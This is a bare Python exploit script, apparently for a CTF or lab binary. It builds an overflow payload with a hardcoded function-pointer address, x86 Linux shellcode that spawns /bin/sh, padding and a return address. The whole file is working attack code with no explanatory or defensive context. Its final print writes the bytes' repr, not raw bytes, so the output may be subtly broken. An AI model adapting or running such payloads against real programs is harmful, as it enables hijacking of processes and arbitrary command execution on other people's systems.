import struct
import sys

def main():
    fct_ptr = 0x804a010

    next_addr = 0x804a010
    end_addr  = 0x804a078
    shellcode = (
        b"\x31\xC0\x31\xD2\x50\x68\x2F\x2F\x73\x68"
        b"\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89"
        b"\xE1\xB0\x0B\xCD\x80"
    )
    padding_len = end_addr - next_addr - len(shellcode)

    fct_ptr_addr = 0x804a00c

    payload = struct.pack("<I", fct_ptr) + shellcode + b"A" * padding_len + struct.pack("<I", fct_ptr_addr)

    print(payload)

if __name__ == "__main__":
    main()
